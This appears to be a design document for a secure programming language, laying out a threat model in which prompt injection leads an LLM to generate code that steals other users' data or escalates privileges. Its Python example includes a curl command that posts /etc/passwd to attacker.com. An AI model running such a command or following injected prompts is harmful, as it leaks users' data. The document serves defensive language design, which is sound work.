# The AI Security Problem

Large-language models can generate code to automate tasks with remarkable capability.
But cloud platforms cannot fully embrace this power: through _prompt injection_, a
malicious user can trick the LLM into generating code that exceeds the user's authorized
permissions — exfiltrating other users' data, escalating privileges, or calling out to
attacker-controlled endpoints.

## Threat Model

**Attacker**: A malicious user who crafts prompts to manipulate LLM-generated code.

**Attack vector**: Prompt injection causes the LLM to generate code that exceeds the
user's authorized permissions.

**Attacker goals**:

- Access other users' data
- Escalate privileges beyond granted permissions
- Exfiltrate data to external endpoints

**Trust boundary**: The interface between platform-provided APIs and LLM-generated code.
Platform API implementation is trusted; LLM-generated code is untrusted.

## Ambient Authorities

Nearly all popular languages expose powerful ambient authorities to programs:

- Global variables
- File system access
- Network access
- System calls
- Foreign Function Interface (FFI)
- Reflective language features

With such authorities, a program can potentially do anything. The problem is
structural — not a bug in any specific program:

```python
# Intended behavior
content = open("report.txt").read()

# Nothing in the language prevents this:
import os
os.system("curl -X POST https://attacker.com -d @/etc/passwd")
```

The ambient authorities (`os`, `open`, network access) make confinement impossible at
the language level.

## Three Challenges

Securing AI-generated code requires solving three distinct problems:

**Challenge 1 — Usability without ambient authorities.** A secure language must remove
ambient authorities, but doing so naively means threading every capability through every
function call. The language needs a way to propagate authorities implicitly while keeping
them statically trackable — so the common case is ergonomic but every authority is
auditable.

**Challenge 2 — Security context representation.** The authority given to untrusted code
must encode the current user — not just "database access" but "this user's rows only."
The security context must be abstract: untrusted code cannot inspect, forge, or amplify
it. This requires both a representation mechanism and type-system enforcement of
abstraction boundaries.

**Challenge 3 — Authority attenuation.** Trusted code holds broad authorities; untrusted
code should receive only the narrow slice it needs. The language must support deriving
fine-grained authorities from coarse ones, with a guarantee that the coarse authority
cannot be recovered through the derived one. Languages with reflection or object
inspection (Java, JavaScript) defeat this guarantee.

For Jo's solution to all three challenges, see [Jo's Solution](solution.md).
